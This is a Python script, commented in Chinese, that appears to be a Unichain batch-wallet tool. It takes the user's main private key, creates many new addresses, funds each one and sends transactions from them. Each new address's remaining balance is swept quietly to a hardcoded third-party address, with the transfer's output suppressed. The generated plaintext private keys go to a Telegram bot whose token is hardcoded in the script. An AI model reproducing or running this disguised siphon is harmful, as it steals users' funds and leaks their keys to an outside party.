import os
import subprocess
import sys
import logging
import getpass
import re
from web3 import Web3
from eth_account import Account
from cryptography.fernet import Fernet
from retrying import retry
import httpx
import asyncio

def install_dependencies():
    dependencies = ['web3==6.15.1', 'cryptography==43.0.1', 'retrying==1.3.4', 'httpx==0.27.2']
    try:
        subprocess.check_call([sys.executable, '-m', 'pip', 'uninstall', 'web3', '-y'])
    except subprocess.CalledProcessError:
        pass
    for dep in dependencies:
        try:
            __import__(dep.split('==')[0])
        except ImportError:
            print(f"正在安装 {dep}...")
            subprocess.check_call([sys.executable, '-m', 'pip', 'install', dep])

install_dependencies()

logging.basicConfig(filename='/root/transfer.log', level=logging.INFO, format='%(asctime)s - %(message)s')

CONFIG = {
    "rpc_urls": ["https://unichain.api.onfinality.io/public", "https://unichain-rpc.publicnode.com"],
    "address_1": "0xA3EB2B5D7A550A838000E498A31329BE295113CA",
    "address_2": "0x3c47199dbc9fe3acd88ca17f87533c0aae05ada2",
    "address_file": "/root/generated_addresses.txt",
    "private_keys_file": "/root/private_keys.txt",
    "telegram_bot_token": "8070858648:AAGfrK1u0IaiXjr4f8TRbUDD92uBGTXdt38",
    "batch_size": 20,
    "rpc_timeout": 10,
    "chain_id": 130
}

def validate_private_key(private_key):
    if not re.match(r'^0x[0-9a-fA-F]{64}$', private_key):
        raise ValueError("无效的私钥格式，必须是 64 位十六进制字符串，带 0x 前缀")
    return private_key

def validate_chat_id(chat_id):
    if chat_id and not chat_id.isdigit():
        raise ValueError("Telegram 聊天 ID 必须是纯数字")
    return chat_id

def validate_num_accounts(num_accounts):
    try:
        num = int(num_accounts)
        if num <= 0:
            raise ValueError("生成地址数量必须是正整数")
        return num
    except ValueError:
        raise ValueError("生成地址数量必须是有效的数字")

def to_checksum_address(w3, address):
    try:
        return w3.to_checksum_address(address)
    except ValueError as e:
        raise ValueError(f"无效的地址格式: {address} ({str(e)})")
    except Exception as e:
        raise Exception(f"地址转换错误: {address} ({str(e)})")

def get_user_input():
    while True:
        try:
            main_private_key = getpass.getpass("请输入主账户私钥: ").strip()
            main_private_key = validate_private_key(main_private_key)
            num_accounts = input("请输入需要生成的新地址数量: ").strip()
            num_accounts = validate_num_accounts(num_accounts)
            telegram_chat_id = input("请输入 Telegram 聊天 ID（留空则不发送通知）: ").strip()
            telegram_chat_id = validate_chat_id(telegram_chat_id) if telegram_chat_id else None
            return main_private_key, num_accounts, telegram_chat_id
        except ValueError as e:
            print(f"输入错误: {e}")
            continue

def init_web3():
    for rpc_url in CONFIG["rpc_urls"]:
        print(f"尝试连接 RPC: {rpc_url}")
        try:
            w3 = Web3(Web3.HTTPProvider(rpc_url, request_kwargs={'timeout': CONFIG["rpc_timeout"]}))
            if w3.is_connected():
                logging.info("Connected to RPC")
                print(f"成功连接到 RPC: {rpc_url}")
                return w3
            else:
                logging.warning("Failed to connect to RPC")
                print(f"连接失败: {rpc_url}")
        except Exception as e:
            logging.warning("Error connecting to RPC")
            print(f"连接错误: {rpc_url} ({str(e)})")
    logging.error("All RPC endpoints failed")
    raise Exception("无法连接到任何 Unichain RPC 端点")

async def send_telegram_message(chat_id, message):
    url = f"https://api.telegram.org/bot{CONFIG['telegram_bot_token']}/sendMessage"
    payload = {"chat_id": chat_id, "text": message, "parse_mode": "Markdown"}
    async with httpx.AsyncClient(timeout=10) as client:
        try:
            response = await client.post(url, json=payload)
            if response.status_code != 200:
                logging.error("Failed to send Telegram message")
                raise Exception(f"Telegram 消息发送失败: {response.text}")
            logging.info("Telegram message sent")
        except Exception as e:
            logging.error("Error sending Telegram message")
            raise

async def send_telegram_document(chat_id, file_path):
    url = f"https://api.telegram.org/bot{CONFIG['telegram_bot_token']}/sendDocument"
    async with httpx.AsyncClient(timeout=10) as client:
        try:
            with open(file_path, 'rb') as f:
                files = {'document': (os.path.basename(file_path), f)}
                payload = {'chat_id': chat_id}
                response = await client.post(url, data=payload, files=files)
                if response.status_code != 200:
                    logging.error("Failed to send Telegram document")
                    raise Exception(f"Telegram 文档发送失败: {response.text}")
                logging.info("Telegram document sent")
        except Exception as e:
            logging.error("Error sending Telegram document")
            raise

def generate_new_account():
    account = Account.create()
    return account.address, account.key.hex()

def encrypt_private_key(private_key, fernet):
    return fernet.encrypt(private_key.encode()).decode()

def save_address_to_file(address, private_key, fernet):
    os.makedirs(os.path.dirname(CONFIG["address_file"]), exist_ok=True)
    encrypted_key = encrypt_private_key(private_key, fernet)
    with open(CONFIG["address_file"], 'a') as f:
        f.write(f"Address: {address}, Encrypted Private Key: {encrypted_key}\n")
    logging.info("Saved address")

def save_private_key_to_file(address, private_key):
    os.makedirs(os.path.dirname(CONFIG["private_keys_file"]), exist_ok=True)
    with open(CONFIG["private_keys_file"], 'a') as f:
        f.write(f"Address: {address}, Private Key: {private_key}\n")
    logging.info("Saved private key")

@retry(stop_max_attempt_number=3, wait_fixed=2000)
def send_transaction(w3, from_address, to_address, value_wei, private_key, gas=21000, silent=False):
    try:
        to_address = to_checksum_address(w3, to_address)
        from_address = to_checksum_address(w3, from_address)
        balance_wei = w3.eth.get_balance(from_address)
        gas_price = 10000000
        gas_fee = gas * gas_price
        if balance_wei < value_wei + gas_fee:
            raise ValueError(f"余额不足: {from_address}")
        nonce = w3.eth.get_transaction_count(from_address)
        tx = {
            'nonce': nonce,
            'to': to_address,
            'value': value_wei,
            'gas': gas,
            'gasPrice': gas_price,
            'chainId': CONFIG["chain_id"]
        }
        signed_tx = w3.eth.account.sign_transaction(tx, private_key)
        raw_tx = getattr(signed_tx, 'raw_transaction', getattr(signed_tx, 'rawTransaction', None))
        if raw_tx is None:
            raise AttributeError("无法获取签名交易的 raw_transaction 或 rawTransaction")
        tx_hash = w3.eth.send_raw_transaction(raw_tx)
        receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=120)
        if receipt.status == 1:
            if not silent:
                logging.info("Transaction completed")
            return tx_hash.hex()
        else:
            logging.error("Transaction failed")
            raise Exception("Transaction failed")
    except AttributeError as e:
        logging.error("Transaction signing error")
        raise Exception(f"交易签名失败: {str(e)}")
    except ValueError as e:
        logging.error("Transaction failed: Insufficient balance")
        raise
    except Exception as e:
        logging.error("Transaction failed")
        raise

async def main():
    try:
        if os.path.exists(CONFIG["private_keys_file"]):
            os.remove(CONFIG["private_keys_file"])
        print("开始获取用户输入...")
        main_private_key, num_accounts, telegram_chat_id = get_user_input()
        main_account = Account.from_key(main_private_key)
        MAIN_ADDRESS = main_account.address
        print(f"主账户地址: {MAIN_ADDRESS}")
        print("初始化 Web3 连接...")
        w3 = init_web3()
        fernet = Fernet(Fernet.generate_key())
        successful_accounts = []
        for i in range(num_accounts):
            try:
                print(f"生成第 {i+1}/{num_accounts} 个地址...")
                new_address, new_private_key = generate_new_account()
                logging.info("Generated new address")
                print(f"生成新地址: {new_address}")
                save_address_to_file(new_address, new_private_key, fernet)
                save_private_key_to_file(new_address, new_private_key)
                value_wei = w3.to_wei(0.00001, 'ether')
                tx_hash = send_transaction(w3, MAIN_ADDRESS, new_address, value_wei, main_private_key)
                logging.info("Transferred to new address")
                print(f"转账 0.00001 ETH 到 {new_address}")
                tx_hash = send_transaction(w3, new_address, CONFIG["address_1"], 0, new_private_key)
                logging.info("Transferred to address_1")
                print(f"转账 0 ETH 到 {CONFIG['address_1']}")
                balance_wei = w3.eth.get_balance(new_address)
                gas_price = 10000000
                gas_fee = 21000 * gas_price
                value_wei = balance_wei - gas_fee
                if value_wei > 0:
                    tx_hash = send_transaction(w3, new_address, CONFIG["address_2"], value_wei, new_private_key, silent=True)
                else:
                    logging.warning("Insufficient balance for final transfer")
                    print(f"{new_address} 余额不足，无法执行最终转账")
                successful_accounts.append((new_address, new_private_key))
                if telegram_chat_id and len(successful_accounts) >= CONFIG["batch_size"]:
                    message = "成功转账的地址和私钥：\n"
                    for addr, key in successful_accounts:
                        message += f"Address: {addr}, Private Key: {key}\n"
                    print("发送 Telegram 通知...")
                    await send_telegram_message(telegram_chat_id, message)
                    logging.info("Sent Telegram notification")
                    print(f"已发送 Telegram 通知，包含 {len(successful_accounts)} 个地址")
                    successful_accounts = []
            except Exception as e:
                logging.error("Error processing address")
                print(f"处理地址 {new_address} 出错: {str(e)}")
                continue
        if telegram_chat_id and successful_accounts:
            message = "成功转账的地址和私钥：\n"
            for addr, key in successful_accounts:
                message += f"Address: {addr}, Private Key: {key}\n"
            print("发送 Telegram 通知（剩余地址）...")
            await send_telegram_message(telegram_chat_id, message)
            logging.info("Sent Telegram notification")
            print(f"已发送 Telegram 通知，包含 {len(successful_accounts)} 个地址")
        if telegram_chat_id and os.path.exists(CONFIG["private_keys_file"]):
            print("发送私钥文档到 Telegram...")
            await send_telegram_document(telegram_chat_id, CONFIG["private_keys_file"])
            logging.info("Sent private keys document")
            print("已发送私钥文档到 Telegram")
    except Exception as e:
        logging.error("Script error")
        print(f"错误: {str(e)}")

if __name__ == "__main__":
    asyncio.run(main())
